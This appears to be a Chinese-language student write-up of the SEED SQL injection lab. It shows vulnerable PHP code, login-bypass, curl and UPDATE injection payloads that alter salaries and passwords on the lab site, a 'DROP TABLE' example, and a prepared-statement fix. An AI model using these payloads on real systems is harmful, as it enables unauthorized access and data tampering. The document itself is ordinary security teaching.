# SQL 注入原理

下图可以很好的表示SQL注入，车牌被识别后，系统会执行drop database指令删除数据库

![](https://img-blog.csdnimg.cn/img_convert/ec8ce91818ae7d3080bdeb55586a55a5.png)

**下面的漫画中，该学生的姓名为“Robert'); DROP TABLE students;--”，导致students表被删除：**

![](https://img-blog.csdnimg.cn/img_convert/5c3cc846a007cb39ab09a6b88c7526ba.png)

在输入的字符串之中注入SQL指令，恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，遭到破坏或是入侵

例如，某个网站的登录验证的SQL查询代码为

```cpp
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

恶意填入

```cpp
userName = "1' OR '1'='1";
```

与

```cpp
passWord = "1' OR '1'='1";
```

时，将导致原本的SQL字符串被填为

```cpp
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

实际上运行的SQL命令会变成下面这样的

```cpp
strSQL = "SELECT * FROM users;"
```

从而达到无账号密码登录网站。所以SQL注入被俗称为**黑客的填空游戏。**

## SQL Injection中的特殊字符：单引号`''`与井号`#`

输入数据两端都会被加上引号`''`作为SQL语句的一部分

比如，下面是一个输入窗口：

![](https://img-blog.csdnimg.cn/img_convert/44fb127eee93184340f3ad7cc69800ad.png)

实际上它的形式：

![](https://img-blog.csdnimg.cn/img_convert/f321fe94d6da7e76b09bd1fa44299434.png)

假若输入数据分别为：`EID5002'  #'`   和  `xyz`

则对应的SQL语句为：

![image-20210323081645971](https://img-blog.csdnimg.cn/img_convert/5fdd2ba79ece2a43aeaf8023f852a8bd.png)

可以看到`#`后的内容被注释

因此，通过人为的输入`''`和`#`，可以改变SQL语句的意义

# lab setup

- 下载实验文件，解压
- 增加hosts映射
- 运行docker

# Task 1: Get Familiar with SQL Statements

```shell
docksh <id> #进入MySQL容器内部

mysql -u root -pdees # root身份进入数据库

use sqllab_users;#使用已创建的sqllab_users数据库

show tables;#显示table

select * from credential; # 打印出credential表全部信息

+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
|  2 | Boby  | 20000 |  30000 | 4/20  | 10213352 |             |         |       |          | b78ed97677c161c1c82c142906674ad15242b2d4 |
|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |
|  4 | Samy  | 40000 |  90000 | 1/11  | 32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |
|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |
|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
6 rows in set (0.02 sec)
```

```php
$input_uname = $_GET[’username’];
$input_pwd = $_GET[’Password’];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);
```

可以看出$input_uname有注入漏洞

# Task 2: SQL Injection Attack on SELECT Statement

www.seed-server.com 是我们要攻击的网站

## Task 2.1: SQL Injection Attack from webpage. 

- username：admin'#
- passwd：随意

成功以admin身份进入

## Task 2.2: SQL Injection Attack from command line.

在不使用网页的情况下完成上述2.1的注入，比如命令行的curl命令

curl语句中要对一些字符进行编码，比如撇号、空格、井号，分别对应%27、%20、%23，详见https://www.w3schools.com/tags/ref_urlencode.ASP

```shell
curl 'http://www.seed-server.com/unsafe_home.php?username=admin%27%23'
```

成功获取对应的网页源码

## Task 2.3: Append a new SQL statement.

```
'or Name='Admin';UPDATE credential  SET Salary = '88888' WHERE Name='Alice';# 在username中

There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UPDATE credential SET Salary = '88888' WHERE Name='Alice';#' and Password='da39' at line 3]\n
```

这说明分号前后被分割为两个语句

# Task 3: SQL Injection Attack on UPDATE Statement

edit profile的源码：

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
        nickname=’$input_nickname’,
        email=’$input_email’,
        address=’$input_address’,
        Password=’$hashed_pwd’,
        PhoneNumber=’$input_phonenumber’
        WHERE ID=$id;";
$conn->query($sql);
```

## Task 3.1: Modify your own salary.

注入如下：

```
',Salary='99999999'#
```

## Task 3.2: Modify other people’ salary.

```
',salary='1' where name='Boby'#
```

## Task 3.3: Modify other people’ password.

先把nmsl转化为sha1，然后填入password字段方可通过nmsl登录成功

```
',password='nmsl' where name='Boby'#
```

# Task 4: Countermeasure — Prepared Statement

预防SQL注入的方法：使用预处理机制，实现代码与数据分离

可以把原先代码通过预处理进行改写：

```php
$conn = getDB();
$stmt = $conn->prepare("SELECT name, local, gender
FROM USER_TABLE
WHERE id = ? and password = ? ");
// Bind parameters to the query
$stmt->bind_param("is", $id, $pwd);
$stmt->execute();
$stmt->bind_result($bind_name, $bind_local, $bind_gender);
$stmt->fetch();
```

在这里，我们将向数据库发送SQL语句的过程分为两个步骤

- 仅发送代码部分，即不包含实际数据的SQL语句。这是准备步骤。从上面的代码片段可以看出，实际数据被问号？代替。
- 使用bind param()将数据发送到数据库。数据库将在此步骤中发送的所有内容 **仅视为数据，不再视为代码。** 它将数据绑定到准备好的语句的相应问号。

通过这种方式，我们将代码与数据做到了分离，从而防止了SQL注入的可能性